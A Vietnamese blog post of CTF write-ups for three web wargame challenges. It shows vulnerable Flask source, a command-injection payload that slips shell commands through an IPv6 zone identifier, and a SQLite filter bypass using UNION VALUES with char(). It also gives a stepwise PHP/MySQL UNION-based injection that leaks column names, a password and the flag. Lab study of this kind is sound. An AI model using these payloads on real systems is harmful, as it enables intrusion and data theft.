+++
date = '2025-04-16T04:02:58+07:00'
draft = true
title = 'Dreamhack Web Wargame'
+++


Sau một thời gian dài cùng với các mảng CTF về ngôn ngữ low-level, mình nghĩ rằng đã đến lúc mình cần một cái gì đó mới mẻ hơn, offensive hơn và web là lựa chọn đó. Ở đây mình sẽ chỉ sưu tầm những chall mình đánh giá là hay, có thể nó không khó nhưng bổ sung cho mình nhiều điều mới mẻ.

## EZ_command_injection

### 1. Recon

Check mã nguồn Web có 2 endpoint là '/', '/ping'. Khi gửi request 'GET' đến endpoint '/ping' thì chương trình sẽ đọc IP là giá trị của biến host, sau đó gọi lệnh hệ thống để ping.

```
#!/usr/bin/env python3
import subprocess
import ipaddress
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/ping', methods=['GET'])
def ping():
    host = request.args.get('host', '')
    try:
        addr = ipaddress.ip_address(host)
    except ValueError:
        error_msg = 'Invalid IP address'
        print(error_msg)
        return render_template('index.html', result=error_msg)

    cmd = f'ping -c 3 {addr}'
    try:
        output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=8)
        return render_template('index.html', result=output.decode('utf-8'))
    except subprocess.TimeoutExpired:
        error_msg = 'Timeout!!!!'
        print(error_msg)
        return render_template('index.html', result=error_msg)
    except subprocess.CalledProcessError:
        error_msg = 'An error occurred while executing the command'
        print(error_msg)
        return render_template('index.html', result=error_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

### 2. Analysis

Như mã nguồn được biết, server sau khi nhận request sẽ đẩy ip (giá trị tham số host) vào biến host, sau đó dùng hàm ipaddress.ip_address() để xác định ip hợp lệ trước khi chạy lệnh ping. Như vậy gần như không thể command injection vào bên trong biến host. Tuy nhiên thì thực ra vẫn có cách để bypass cơ chế này.

![alt text](/images/dhweb1.png)

Theo tài liệu python, ipaddress.ip_address() sẽ lấy chính xác địa chỉ ip đúng định dạng, tuy nhiên ipv6 có một cơ chế tên là Zone Identifier. Zone Identifier dùng để xác định chính xác loại Interface sử dụng để gửi gói tin trong link-local. Tuy nhiên nếu như chúng ta chèn thêm phía sau Zone Identifer và url_encode thì python sẽ không thể nhận ra ip không hợp lệ, điều này giúp chúng ta đạt được RCE.

### 3. Exploitation

Sử dụng burp pro để điều chỉnh GET request tới server.

![alt text](/images/dhweb2.png)

Như mình đề cập ở trên, phần Zone Identifier sẽ mắc theo cả phần string phía sau nên mình sẽ lợi dụng điều này chèn command 'cat flag.txt'. Như vậy payload mình chèn vào sẽ là:

```fe80::1%eth0 & cat flag.txt &```
Mình không chắc chắn cách server xử lý nên để chắc ăn mình sẽ encode nó lại theo url encode. Gửi request và thu được flag.

![alt text](/images/dhweb3.png)

### 4. Reference

- https://docs.python.org/3/library/ipaddress.html#module-ipaddress
- https://datatracker.ietf.org/doc/html/rfc6874



## baby-SQLite

### 1. Recon
Web có 2 endpoint '/', '/login'. Khi đăng nhập thì client sẽ gửi một POST request thông tin về uid,upw lên server. Server trả về flag nếu uid='admin'.

### 2. Analysis

Đọc mã nguồn server, mình nhận thấy câu lệnh truy vấn của phía server có tận 3 tham số uid,upw và level. Như vậy nếu như mình thêm tham số level vào request thì mình có thể ghi đè thoải mái vào level. Tuy nhiên server lại có filter để tránh tình trạng đó.

```sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']```

Như vậy việc dùng SELECT để SQLi UNION-based gần như là không thể. Sau khi mình tìm hiểu thì còn một cách khác là UNION VALUES trong SQLite. Bên cạnh đó thì 'admin' cũng bị filter nên mình sẽ chuyển từ các giá trị ascii về ký tự bằng hàm char.

### 3. Exploitaiton

Dựa trên những phân tích này, mình xây dựng được payload.
```0/**/UNION/**/VALUES(char(97)||char(100)||char(109)||char(105)||char(110))```

Tiêm payload vào parameter level gửi đến server.

![alt text](/images/dhweb4.png)

Server trả về flag như mong đợi.

![alt text](/images/dhweb5.png)
* NOTE: về SQLite Mình có bảng tham khảo lệnh truy vấn.

![alt text](/images/dhweb6.png)


## [wargame.kr] adm1nkyj

### 1. Recon

Trang web cho biết mã nguồn PHP của server khi truy cập vào. Khi server nhận đúng 3 giá trị id,pw và flag, server sẽ trả về flag thật cho chúng ta. Nếu không sẽ thực thi ```echo "Hello ".$query[$id_column]."<hr>";```.

### 2. Analysis & Exploitation

Đọc query chính của server: 
```$query = mysql_fetch_array(mysql_query("SELECT * FROM findflag_2 WHERE $id_column='{$id}' and $pw_column='{$pw}';"));```

nếu chúng ta ghi đè vào tham số id để truy vấn "SELECT * FROM findflag_2" luôn đúng thì có thể chúng ta lấy được giá trị trong cột lưu trong biến $id_column. Đơn giản nhất là ```OR 1=1```.


![alt text](/images/dhweb6.png)

![alt text](/images/dhweb8.png)


Lấy được 1 giá trị trong cột là 'adm1ngnngn', có vẻ là 1 giá trị mình cần tìm vì có liên quan đến admin.

Tuy nhiên thì do chỉ in ra giá trị $id_column trong query nên chúng ta không thể leak các cột $pw_column bằng UNION-based thông thường.

Chúng ta nhìn lại logic lấy query.
``` 
$query = mysql_fetch_array(mysql_query("SELECT * FROM findflag_2 WHERE $id_column='{$id}' and $pw_column='{$pw}';"));
```
và 
```
echo "Hello ".$query[$id_column]."<hr>"
```

```$query[$id_column]``` sẽ trả về giá trị mà ```$id_column``` so sánh với trong query, tuy nhiên thì nếu như query có lệnh so sánh ```$id_column``` không trả về bất kỳ thứ gì thì nó sẽ lấy giá trị query trả về.

Bên cạnh đó, biến ```$pw_column``` lại chứa tên cột của pw. Vậy nếu ép query trả về ```$pw_column``` thì ```$query[$id_column]=$pw_column```. Thử thì nhìn thấy ở cột thứ 2 của query mới hiển thị trên response về client nên chúng ta xây dựng được payload.

```
?id='+and+0+union+select+1,&pw=3,4,5--+-
```

Query lúc đó sẽ trở thành:
```
SELECT * FROM findflag_2 WHERE $id_column='' and 0 union select 1, 'and $pw_column=',3,4,5;
```

Gửi request đến server và nhận response:
![alt text](/images/dhweb9.png)

Như vậy `$pw_column=xPw4coaa1sslfe`. Biết được tên cột rồi thì mình cần query để dò giá trị mật khẩu của admin.

Cũng cùng kỹ thuật trên, chúng ta sẽ ép cho truy vấn gốc bị vô hiệu để `$query[$id_column]` sẽ trả về giá trị thu được từ query. Biết được tên column rồi thì chúng ta thực hiện truy vấn với payload sau.

`?id='+and+0+union+select+1,(select+xPw4coaa1sslfe+from+findflag_2),3,4,5--+-`

![alt text](/images/dhweb10.png)

Thử gửi request với giá trị tài khoản và mật khẩu thu được.

![alt text](/images/dhweb11.png)

Response trả về cho thấy id và pw đã đúng. Điều tiếp theo mình cần tìm là flag. Flag được lưu trong hẳn 1 column tên là flag_column. Do vậy mình vẫn cần dựa vào truy vấn để tìm flag. Trước tiên thì chúng ta vẫn không biết chính xác tên cột flag để gọi truy vấn, tuy nhiên truy vấn gốc cho ta biết rằng có 5 cột nên mình sẽ thay phiên dump giá trị 5 cột đó ra. Ý tưởng sẽ là tạo một bảng ảo bằng subquery với dòng đầu tiên là ảo, dòng thứ 2 sẽ là giá trị dump từ findflag_2. Thử query tất cả các vị trí của bảng ảo này thì mình tìm thấy được `$flag_column` nằm ở cột 4. Như vậy mình chỉ cần lấy giá trị truy vấn dòng thứ 2 của bảng ảo cột 4:

![alt text](/images/dhweb12.png)

Payload:`?id='+and+0+union+select+1,flag,3,4,5+from+(select+1,2,3,4+as+flag,5+union+select+*+from+findflag_2+LIMIT+1,1)x--+-`

Gửi request có cả id,pw và flag đến server để nhận được đáp án.

![alt text](/images/dhweb13.png)

### 3. Conclusion

Bản thân mình nhận thấy đây là một chall rất hay khi yêu cầu một chút khả năng hiểu logic lỗi của code PHP. Mấu chốt nằm ở việc lấy được giá trị `$pw_column` để tìm mật khẩu.


